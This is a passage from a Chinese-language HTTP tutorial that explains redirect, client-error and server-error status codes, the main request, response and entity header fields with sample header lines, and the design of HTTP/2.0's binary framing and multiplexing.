绑定的成员已经在（多状态）响应之前的部分被列举，且未被再次包含。 226 IM Used 服务器已经满足了对资源的请求，对实体请求的一个或多个实体操作的结果表示。 3xx ———— 重定向状态码 状态码 状态名 状态描述 300 Multiple Choices 被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。 除非这是一个 HEAD 请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由 Content-Type 定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616 规范并没有规定这样的自动选择该如何进行。 如果服务器本身已经有了首选的回馈选择，那么在 Location 中应当指明这个回馈的 URI；浏览器可能会将这个 Location 值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。 301 Moved Permanently 被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。 新的永久性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 注意：对于某些使用 HTTP/1.0 协议的浏览器，当它们发送的 POST 请求得到了一个 301 响应的话，接下来的重定向请求将会变成 GET 方式。 302 Found 要求客户端执行临时重定向（原始描述短语为“Moved Temporarily”）。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在 Cache-Control 或 Expires 中进行了指定的情况下，这个响应才是可缓存的。 新的临时性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 注意：虽然 RFC 1945 和 RFC 2068 规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将 302 响应视作为 303 响应，并且使用 GET 方式访问在 Location 中规定的 URI，而无视原先请求的方法。因此状态码 303 和 307 被添加了进来，用以明确服务器期待客户端进行何种反应。 303 See Other 对应当前请求的响应可以在另一个 URI 上被找到，当响应于 POST（或 PUT / DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的 GET 消息发出重定向。这个方法的存在主要是为了允许由脚本激活的 POST 请求输出重定向到一个新的资源。这个新的 URI 不是原始资源的替代引用。同时，303 响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。 新的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 注意：许多 HTTP/1.1 版以前的浏览器不能正确理解 303 状态。如果需要考虑与这些浏览器之间的互动，302 状态码应该可以胜任，因为大多数的浏览器处理 302 响应时的方式恰恰就是上述规范要求客户端处理 303 响应时应当做的。 304 Not Modified 表示资源未被修改，因为请求头指定的版本 If-Modified-Since 或 If-None-Match。在这种情况下，由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。 305 Use Proxy 被请求的资源必须通过指定的代理才能被访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能创建 305 响应。许多 HTTP 客户端（像是 Mozilla 和 Internet Explorer）都没有正确处理这种状态代码的响应，主要是出于安全考虑。 注意：RFC 2068 中没有明确 305 响应是为了重定向一个单独的请求，而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。 306 Switch Proxy 在最新版的规范中，306 状态码已经不再被使用。最初是指“后续请求应使用指定的代理”。 307 Temporary Redirect 在这种情况下，请求应该与另一个 URI 重复，但后续的请求应仍使用原始的 URI。 与 302 相反，当重新发出原始请求时，不允许更改请求方法。 例如，应该使用另一个 POST 请求来重复 POST 请求。 308 Permanent Redirect 请求和所有将来的请求应该使用另一个 URI 重复。 307 和 308 重复 302 和 301 的行为，但不允许 HTTP 方法更改。 例如，将表单提交给永久重定向的资源可能会顺利进行。 4xx ———— 客户端错误状态码 状态码 状态名 状态描述 400 Bad Request 由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求。 401 Unauthorized 类似于 403 Forbidden，401 语义即“未认证”，即用户没有必要的凭据。该状态码表示当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么 401 响应代表着服务器验证已经拒绝了那些证书。如果 401 响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。 注意：当网站（通常是网站域名）禁止 IP 地址时，有些网站状态码显示的 401，表示该特定地址被拒绝访问网站。 402 Payment Required 该状态码是为了将来可能的需求而预留的。该状态码最初的意图可能被用作某种形式的数字现金或在线支付方案的一部分，但几乎没有哪家服务商使用，而且这个状态码通常不被使用。如果特定开发人员已超过请求的每日限制，Google Developers API 会使用此状态码。 403 Forbidden 服务器已经理解请求，但是拒绝执行它。与 401 响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个 404 响应，假如它不希望让客户端获得任何信息。 404 Not Found 请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用 410 状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404 这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。 405 Method Not Allowed 请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。例如，需要通过 POST 呈现数据的表单上的 GET 请求，或只读资源上的 PUT 请求。 鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回 405 错误。 406 Not Acceptable 请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体，该请求不可接受。 除非这是一个 HEAD 请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址列表的实体。实体的格式由 Content-Type 头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。 407 Proxy Authentication Required 与 401 响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。 408 Request Timeout 请求超时。根据 HTTP 规范，客户端没有在服务器预备等待的时间内完成一个请求的发送，客户端可以随时再次提交这一请求而无需进行任何更改。 409 Conflict 表示因为请求存在冲突无法处理该请求，例如多个同步更新之间的编辑冲突。 410 Gone 表示所请求的资源不再可用，将不再可用。当资源被有意地删除并且资源应被清除时，应该使用这个。在收到 410 状态码后，用户应停止再次请求资源。但大多数服务端不会使用此状态码，而是直接使用 404 状态码。 411 Length Required 服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求。 412 Precondition Failed 服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。 413 Request Entity Too Large 前称“Request Entity Too Large”，表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。 如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。 414 Request-URI Too Long 前称“Request-URI Too Long”，表示请求的 URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。通常将太多数据的结果编码为 GET 请求的查询字符串，在这种情况下，应将其转换为 POST 请求。这比较少见，通常的情况包括： 本应使用 POST 方法的表单提交变成了 GET 方法，导致查询字符串过长。 重定向 URI“黑洞”，例如每次重定向把旧的 URI 作为新的 URI 的一部分，导致在若干次重定向后 URI 超长。 客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的 URI，当 GET 后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行。没有此类漏洞的服务器，应当返回 414 状态码。 415 Unsupported Media Type 对于当前请求的方法和所请求的资源，请求中提交的互联网媒体类型并不是服务器中所支持的格式，因此请求被拒绝。例如，客户端将图像上传格式为 svg，但服务器要求图像使用上传格式为 jpg。 416 Requested Range Not Satisfiable 前称“Requested Range Not Satisfiable”。客户端已经要求文件的一部分（Byte serving），但服务器不能提供该部分。例如，如果客户端要求文件的一部分超出文件尾端。 417 Expectation Failed 在请求头 Expect 中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服显的证据证明在当前路由的下一个节点上，Expect 的内容无法被满足。 418 I’m a teapot 本操作码是在 1998 年作为 IETF 的传统愚人节笑话, 在 RFC 2324 超文本咖啡壶控制协议’中定义的，并不需要在真实的 HTTP 服务器中定义。当一个控制茶壶的 HTCPCP 收到 BREW 或 POST 指令要求其煮咖啡时应当回传此错误。这个 HTTP 状态码在某些网站（包括 Google.com）与项目（如 Node.js、ASP.NET 和 Go 语言）中用作彩蛋。 420 Enhance Your Caim Twitter Search 与 Trends API 在客户端被限速的情况下返回。 421 Misdirected Request 该请求针对的是无法产生响应的服务器（例如因为连接重用）。 422 Unprocessable Entity 请求格式正确，但是由于含有语义错误，无法响应。 423 Locked 当前资源被锁定。 424 Failed Dependency 由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH。 425 Unordered Collection 在 WebDAV Advanced Collections Protocol 中定义，但 Web Distributed Authoring and Versioning (WebDAV) Ordered Collections Protocol 中并不存在。 426 Upgrade Required 客户端应当切换到 TLS/1.0，并在 HTTP/1.1 Upgrade header 中给出。 428 Precondition Required 原服务器要求该请求满足一定条件。这是为了防止“‘未更新’问题，即客户端读取（GET）一个资源的状态，更改它，并将它写（PUT）回服务器，但这期间第三方已经在服务器上更改了该资源的状态，因此导致了冲突。” 429 Too Many Requests 用户在给定的时间内发送了太多的请求。旨在用于网络限速。 431 Request Header Fields Too Large 服务器不愿处理请求，因为一个或多个头字段过大。 444 No Response Nginx 上 HTTP 服务器扩展。服务器不向客户端返回任何信息，并关闭连接（有助于阻止恶意软件）。 450 Blocked by Windows Parental Controls 这是一个由 Windows 家庭控制（Microsoft）HTTP 阻止的 450 状态代码的示例，用于信息和测试。 451 Unavailable For Legal Reasons 该访问因法律的要求而被拒绝，由 IETF 在 2015 核准后新增加。 494 Request Header Too Large 在错误代码 431 提出之前 Nginx 上使用的扩展 HTTP 代码。 5xx ———— 服务器错误状态码 状态码 状态名 状态描述 500 Internal Server Error 通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息。 501 Not Implemented 服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。（例如，网络服务 API 的新功能） 502 Bad Gateway 作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。 503 Service Unavailable 由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是暂时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 Retry-After 头用以标明这个延迟时间。如果没有给出这个 Retry-After 信息，那么客户端应当以处理 500 响应的方式处理它。 504 Gateway Timeout 作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI 标识出的服务器，例如 HTTP、FTP、LDAP）或者辅助服务器（例如 DNS）收到响应。 注意：某些代理服务器在 DNS 查询超时时会返回 400 或者 500 错误。 505 HTTP Version Not Supported 服务器不支持，或者拒绝支持在请求中使用的 HTTP 版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。 506 Variant Also Negotiates 由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误，被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。 507 Insufficient Storage 服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。 508 Loop Detected 服务器在处理请求时陷入死循环。（可代替 208 状态码） 510 Not Extended 获取资源所需要的策略并没有被满足。 511 Network Authentication Required 客户端需要进行身份验证才能获得网络访问权限，旨在限制用户群访问特定网络。（例如连接 WiFi 热点时的强制网络门户） HTTP 头部字段HTTP 头字段根据实际用途被分为以下 4 种类型： 通用头字段(英语：General Header Fields) 请求头字段(英语：Request Header Fields) 响应头字段(英语：Response Header Fields) 实体头字段(英语：Entity Header Fields) HTTP 通用头字段一、Cache-Control通过这个首部字段可以操作缓存的工作机制。它的参数是可选的，多个指令之间通过 “,” 分隔，例如：1Cache-Control: private, max-age=0, no-cache 缓存请求指令： 指令 参数 说明 no-cache 无 强制向源服务器再次验证 no-store 无 不缓存请求或响应的任何内容 max-age=[秒] 必需 响应的最大 Age 值 max-stale=[秒] 可省略 接收已过期的响应 min-fresh=[秒] 必需 期望在指定时间内的响应仍有效 no-transform 无 代理不可更改媒体类型 only-if-cached 无 从缓存获取资源 cache-extension - 新指令标记 缓存响应指令： 指令 参数 说明 public 无 可向任意方提供响应的缓存 private 可省略 仅向特定用户返回响应 no-cache 可省略 缓存前必须确认其有效性 no-store 无 不缓存请求或响应的任何内容 no-transform 无 代理不可更改媒体类型 must-revalidate 无 可缓存但必须向源服务器进行确认 proxy-revalidate 无 要求中间缓存服务器对缓存的响应有效性再进行确认 max-age=[秒] 必需 响应的最大 Age 值 s-macage=[秒] 必需 公共缓存服务器响应的最大 Age 值 cache-extension - 新指令标记 public 指令1Cache-Control: public 此指令表示其它用户也可利用缓存。 private 指令1Cache-Control: private 此指令表示响应只以特定的用户作为对象，与 public 的行为正好相反。 no-cache 指令1Cache-Control: no-cache 此指令的目的是为了防止从缓存中返回 过期 的资源。 no-store 指令1Cache-Control: no-store 此指令规定不能在本地存储请求或者响应的任何一部分。 从字面意思上很容易把 no-cache 误解成为不缓存，实际它代表的是不缓存过期的资源，缓存会向源服务器进行有效期确认后处理资源，也许称为 do-not-serve-from-cache-without-revalidation 更合适。no-store 才是真正地不进行缓存，请注意它们的区别。 max-age 指令1Cache-Control: maxage=604800（单位：秒） 当客户端发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。当 max-age 值为 0，缓存服务器需要将请求转发给源服务器。 当服务器返回的响应中包含 max-age 指令时，缓存服务器将不对资源的有效性再作确认，它的数值代表了缓存的最长时间。如果同时存在 Expires 字段，会优选处理 max-age 指令，而忽略掉 Expires 字段。 s-maxage 指令1Cache-Control: s-maxage=604800（单位：秒） 它的作用和 max-age 指令相同，不同点有两个： 此指令只适用于供多位用户使用的公共缓存服务器，对于向同一用户重复返回响应的服务器来说，这个指令是没有用的。 当使用此指令后，会直接忽略对 Expires、max-age 指令的处理。 min-fresh 指令1Cache-Control: min-fresh=60（单位：秒） 此指令要求缓存服务器返回还未过指定时间的缓存资源。 max-stale 指令1Cache-Control: max-stale=3600（单位：秒） 此指令表示即使缓存资源过期也照常接收。如果未指定参数值，那么无论经过多久，客户端都会接收响应。如果指定了具体值，那么即使过期，只要没有超过 max-stale 指定的时间内，客户端依然会接收。 only-if-cached 指令1Cache-Control: only-if-cached 此指令表示客户端仅在缓存服务器本直缓存了目标资源的情况下，才会要求其返回。该指令不要求缓存服务器重新加载响应，也不会再次确认资源有效性。若缓存服务器无响应，则返回 504 Gateway Timeout。 must-revalidate 指令1Cache-Control: must-revalidate 此指令表示代理服务器会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。若代理服务器无法从源服务器获取有效资源的话，应该给客户端返回 504 Gateway Timeout。使用此指令之后，max-stale 指令会被忽略。 proxy-revalidate 指令1Cache-Control: proxy-revalidate 此指令表示所有的缓存服务器在返回响应之前必须再次验证缓存的有效性。 no-transform 指令1Cache-Control: no-transform 此指令表示无论是在请求或者响应中，缓存都不能改变实体主体的缓存类型。 Cache-Control 扩展 cache-extension token1Cache-Control: private, community=\"UCI\" 通过此标记，可以扩展 Cache-Control 的字段指令。如上例，就扩展了 community 这个指令。如果目标服务器不理解这个指令，就会直接忽略。 二、connectionconnection 首部字段有两个作用： 控制不再转发给代理的首部字段 1connection: 不再转发的首部字段名 管理持久连接 HTTP/1.1 默认都是持久连接的，客户端可以在持久连接上连续发送请求。当服务器明确想断开连接时，则指定首部字段值为 close：1Connection: close HTTP/1.1 之前的版本如果想维持持久连接，则需要明确指定字段值为 Keep-Alive：1Connection: Keep-Alive 三、Date首部字段 Date 表明创建 HTTP 报文的日期和时间。 四、Pragma首部字段 Pragma 是 HTTP/1.1 之前版本的遗留字段，只用在客户端请求中。作用是要求所有的中间服务器不返回缓存资源。因此为了兼容 HTTP/1.1 之前的版本，在发送请求时会包含两个首部字段：12Cache-Control: no-cachePragma: no-cache 五、Trailer首部字段 Traliler 事先说明了报文主体后记录了哪些首部和字段，主要是应用在分块传输编码时。 六、Transfer-Encoding首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式，仅对分块传输编码有效。 七、Upgrade首部字段 Upgrade 用于检测 HTTP 协议及其它协议是否可用更高的版本进行通信，其参数可以用来指定一个完全不同的通信协议。 八、Via首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。报文经过代理或者网关时，会先在首部 Via 中附加服务器的信息，然后再进行转发。 九、Warning首部字段 Warning 通常会告知用户一些与缓存相关的问题警告。 HTTP 请求头字段请求首部字段是从客户端往服务器发送请求报文中所使用的字段，用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。 一、Accept首部字段 Accept 通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可使用 type/subtype 这种形式，一次指定多种媒体类型。 1Accept: text/plain; q=0.3, text/html 使用 q= 来表示媒体类型的优先级，用分号进行分隔。权重 q 值的范围是 0~1（可精确到小数点后 3 位）。不指 q 值时，默认权重为 q=1.0。所以，浏览器会优先返回权重值最高的媒体类型。 二、Accept-Charset首部字段 Accept-Charset 用来告知服务器用户代理支持的字符集及字符集的优先顺序。可一次性指定多种字符集，使用权重 q 来表示相对优先级顺序。 1Accept-Charset: iso-8859-5, unicode-1-1; q=0.8 三、Accept-Encoding首部字段 Accept-Encoding 用来告知服务器用户代理支持的内容编码。可一次性指定多种，使用权重 q 表示相对优先级顺序。也可使用星号（*）作为通配符，指定任意的编码格式。常用的几种编码：gzip、compress、deflate、identity。 四、Accept-Language首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等）。可指定多个自然语言集，使用权重 q 来表示相对优先级顺序。 1Accept-Language: zh-cn,zh; q=0.7, en-us,en; q=0.3 五、Authorization首部字段 Authorization 用来告知服务器用户代理的认证信息（证书值）。 1Authorization: Basic dWVub3NlbjpwYXNzd29yZA== 六、Expect首部字段 Expect 用来告知服务器期望出现的某种特定行为。如果服务器无法理解发生错误时，应该返回状态码 417 Expectation Failed. 七、From首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。1From: info@jd.com 八、Host首部字段 Host 告知服务器请求的资源所处的互联网主机名和端口号。它是 HTTP/1.1 规范内唯一一个必须被包含在请求内的首部字段。1Host: www.jd.com 九、If-Match形如 If-Match 的请求首部字段，都可称为条件请求。只有当 If-Match 的字段值跟 Etag 值匹配一致时，服务器才会执行请求。如果指定星号（*）值，则服务器会忽略 Etag 值，只要资源存在就会处理请求。1If-Match: \"123456\" 十、If-Modified-Since它会告知服务器若 If-Modified-Since 的字段值早于资源的更新时间，则希望能处理此请求。否则，服务器应该返回状态码 304 Not Modified。一般用于确认代理或者客户端本地缓存资源的有效性。1If-Modified-Since: Thu, 15 Apr 2004 00:00:00 GMT 十一、If-None-Match此首部字段用于告知服务器，当它的字段值与 Etag 不一致时，希望服务器处理该请求。 十二、If-Range此首部字段用于告知服务器，当它的字段值与请求资源的 Etag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。1If-Range: \"123456\" 十三、If-Unmodified-Since此首部字段用于告知服务器，指定的请求资源只有在字段值指定的日期之后，未发生更新的情况下，才能处理请求。否则，服务器应该返回状态码 412 Precondition Failed。1If-Unmodified-Since: Thu, 03 Jul 2012 00:00:00 GMT 十四、Max-Forwards通过 TRACE 方法或者 OPTIONS 方法，发送包含此首部字段的请求时，字段值以十进制整数形式指定可经过的服务器最大数目。1Max-Forwards: 10 十五、Proxy-Authorization此首部字段用于告知代理服务器所需要的认证信息。这个认证只发生于客户端与代理服务器之间。客户端与服务器之间的认证需要使用首部字段 Authorization。1Proxy-Authorization: Basic dGlwOjkpNLAGfFY5 十六、Range此首部字段用于告知服务器获取部分资源的范围请求，例如以下示例就是获取从第 5001 字节至第 10000 字节的资源。服务器处理请求之后返回的状态码应该为 206 Partial Content。无法处理该请求时，应该返回状态码 200 OK 以及全部资源。1Range: 5001-10000 十七、Referer此首部字段会告知服务器请求的原始资源 URI。但是，直接在浏览器地址栏输入 URI 或者出于安全考虑时，也可以不发送该首部字段。另外，Referer 的正确拼写应该是 Referrer，不知为何，这个错误一直延续至今。1Referer: http://www.jd.com 十八、TE此首部字段用于告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相似，但是用于传输编码。1TE: gzip, deflate;q=0.5 十九、User-Agent此首部字段会将创建请求的浏览器和用户代理名称等信息传达给服务器。1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/⇒20100101 Firefox/13.0.1 HTTP 响应头字段响应首部字段是由服务器端向客户端返回响应报文中所使用的字段，用过补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息。 一、Accept-Ranges此首部字段用于告知客户端服务器是否能处理范围请求。如果能处理返回的值为 bytes，否则返回的值为 none。1Accept-Ranges: bytes 二、Age此首部字段用于告知客户端，服务器在多久前创建了响应，单位为秒。若是缓存服务器，则是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须带上此首部字段。1Age: 600 三、ETag它是一种可将资源以字符串形式做唯一标识的方式。服务器会为每份资源分配对应的 ETag 值。资源更新时，ETag 值也会更新。生成 ETag 值的算法由服务器决定。ETag 值分为两种： 强 ETag 值 不认实体发生多么细微的变化都会改变其值。1ETag: \"usagi-1234\" 弱 ETag 值 只用于提示资源是否相同，只有资源发生了根本改变，产生差异时才会改变 ETag 值，而且在字符值最开始处附加 W/。1ETag: W/\"usagi-1234\" 四、Location几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试进行资源重定向。1Location: http://www.jd.com 五、Proxy-Authenticate把由代理服务器所要求的认证信息发送给客户端。1Proxy-Authenticate: Basic realm=\"Usagidesign Auth\" 六、Retry-After此首部字段告知客户端应该在多久之后再次发送请求。主要是配合状态码 503 Service Unavailable 或者 3xx Redirect。可以指定具体的时间值，也可以是创建响应后的秒数。1Retry-After: 120 七、Server此首部字段告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不仅仅有应用程序的名称，还有可能包括版本号和安装时启用的可选项。12Server: Apache/2.2.17 (Unix)Server: Apache/2.2.6 (Unix) PHP/5.2.5 八、Vary此首部字段可对缓存进行控制。从代理服务器收到源服务器返回包含 Vary 的响应之后，若要再进行缓存，仅对请求中含有相同 Vary 字段值的请求返回缓存。即使请求相同的资源，但是 Vary 指定的首部字段值不相同，也要必须从源服务器重新获取资源。1Vary: Accept-Language 九、WWW-Authenticate此首部字段用于 HTTP 访问认证。1WWW-Authenticate: Basic realm=\"Usagidesign Auth\" HTTP 实体头字段实体首部字体是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。 一、Allow此首部字段用于告知客户端能够支持 Request-URI 指定资源的 HTTP 方法。当服务器收到不支持的 HTTP 方法时，会返回状态码 405 Method Not Allowed，并且还会把所有支持的 HTTP 方法写入首部字段 Allow 后返回。1Allow: GET, HEAD 二、Content-Encoding此首部字段用于告知客户端服务器对实体的主体部分选用的内容编码方式。1Content-Encoding: gzip 三、Content-Language此首部字体用于告知客户端，实体主体使用的自然语言（指中文或者英文等）。1Content-Language: zh-CN 四、Content-Length此首部字段表明了实体主体部分的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用 Content-Length 首部字段。1Content-Length: 15000 五、Content-Location此首部字段表示的是报文主体返回资源对应的 URI。1Content-Location: http://www.jd.com/index.html 六、Content-MD5此首部字段是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整。客户端会对接收的报文主体执行相同的 MD5 算法，然后与此首部字段值进行比较。1Content-MD5: OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY== 七、Content-Range作为返回响应时使用此首部字段，能告知客户端返回的实体的哪个部分符合范围请求。字段值以字节为单位。1Content-Range: bytes 5001-10000/10000 八、Content-Type此首部字段说明了实体主体内对象的媒体类型。字段值用 type/subtype 形式赋值。1Content-Type: text/html; charset=UTF-8 九、Expires此首部字段用于告知客户端缓存资源失效的日期。1Expires: Wed, 04 Jul 2012 08:26:05 GMT 十、Last-Modified此首部字段用来指明资源的最后修改时间。1Last-Modified: Wed, 23 May 2012 09:59:55 GMT HTTP 请求过程 域名解析 与目标 IP 建立起基于 TCP 的 HTTP 连接 传输请求数据 服务器收到请求数据 服务器执行对应的 CGI 程序进行处理 服务器把处理结果通过之前建立起来的 HTTP 连接响应给客户端 客户端将响应结果处理后渲染给用户，同时服务器关闭与客户端建立的\b连接 HTTP 2.0 的特性一、HTTP 2.0：改进传输性能 HTTP 2.0 的主要目标是改进传输性能，实现低延迟和高吞吐量。从另一方面看，HTTP 的高层协议语义并不会因为这次版本升级而受影响。所有 HTTP 首部、值，以及它们的使用场景都不会变。 现有的任何网站和应用，无需做任何修改都可以在 HTTP 2.0 上跑起来。不用为了利用 HTTP 2.0 的好处而修改标记。HTTP 服务器必须运行 HTTP 2.0 协议，但大部分用户都不会因此而受到影响。 二、HTTP2.0 历史及其与 SPDY 的渊源 SPDY 是谷歌开发的一个实验性协议，于 2009 年年中发布，主要目标是通过解决 HTTP 1.1 中广为人知的一些性能限制，来减少网页的加载延迟 SPDY 协议设定的目标 页面加载时间（PLT，Page • Load Time）降低 50%； 无需网站作者修改任何内容； 把部署复杂性降至最低，无需变更网络基础设施； 与开源社区合作开发这个新协议； 收集真实性能数据，验证这个实验性协议是否有效。 注：为了达到降低 50% 页面加载时间的目标，SPDY 引入了一个新的二进制分帧数据层，以实现多向请求和响应、优先次序、最小化及消除不必要的网络延迟，目的是更有效地利用底层 TCP 连接；HTTP-WG（HTTP Working Group）在 2012 年初把 HTTP 2.0 提到了议事日程，吸取 SPDY 的经验教训，并在此基础上制定官方标准三、HTTP2.0 深入探究 HTTP/2.0 应该满足如下条件： 相对于使用 TCP 的 HTTP 1.1，• 用户在大多数情况下的感知延迟要有实质上、可度量的改进； 解决 HTTP 中的 “队首阻塞” 问题； 并行操作无需与服务器建立多个连接，从而改进 TCP 的利用率，特别是拥塞控制方面； 保持 HTTP 1.1 的语义，利用现有文档，包括（但不限于）HTTP 方法、状态码、URI，以及首部字段； 明确规定 HTTP 2.0 如何与 HTTP 1.x 互操作，特别是在中间介质上； 明确指出所有新的可扩展机制以及适当的扩展策略。 HTTP 2.0 致力于突破上一代标准众所周知的性能限制，但它也是对之前 1.x 标准的扩展，而非替代。之所以要递增一个大版本到 2.0，主要是因为它改变了客户端与服务器之间交换数据的方式，HTTP 2.0 增加了新的二进制分帧数据层四、HTTP2.0 设计和技术目标 HTTP/2.0 通过支持首部字段压缩和在同一连接上发送多个并发消息，让应用更有效地利用网络资源，减少感知的延迟时间。而且，它还支持服务器到客户端的主动推送机制。 二进制分帧层 HTTP 2.0 二进制分帧层，封装 HTTP 消息并在客户端与服务器之间传输 HTTP2.0 将所有传输的信息分割为更小的消息和帧，并对它们采用二进制格式的编码。 注：HTTPS 是二进制分帧的另一个典型示例：所有 HTTP 消息都以透明的方式为我们编码和解码，不必对应用进行任何修改。HTTP2.0 工作原理有点类似 流、消息和帧 流：流是连接中的一个虚拟信道，可以承载双向的消息；每个流都有一个唯一的整数标识符（1、2…N）； 消息：是指逻辑上的 HTTP 消息，比如请求、响应等，由一或多个帧组成。 帧：HTTP 2.0 通信的最小单位，每个帧包含帧首部，至少也会标识出当前帧所属的流，承载着特定类型的数据，如 HTTP 首部、负荷，等等 HTTP 2.0 的所有帧都采用二进制编码，所有首部数据都会被压缩。 所有通信都在一个 TCP 连接上完成。 HTTP 2.0 把 HTTP 协议通信的基本单位缩小为一个一个的帧，这些帧对应着逻辑流中的消息。相应地，很多流可以并行地在同一个 TCP 连接上交换消息 多向请求与响应 HTTP 2.0 中新的二进制分帧层突破了这些限制，实现了多向请求和响应：客户端和服务器可以把 HTTP 消息分解为互不依赖的帧，然后乱序发送，最后再在另一端把它们重新组合起来 图中包含了同一个连接上多个传输中的数据流：客户端正在向服务器传输一个 DATA 帧（stream 5），与此同时，服务器正向客户端乱序发送 stream 1 和 stream 3 的一系列帧。此时，一个连接上有 3 个请求 / 响应并行交换！ 把 HTTP 消息分解为独立的帧，交错发送，然后在另一端重新组装是 HTTP 2.0 最重要的一项增强。这个机制会在整个 Web 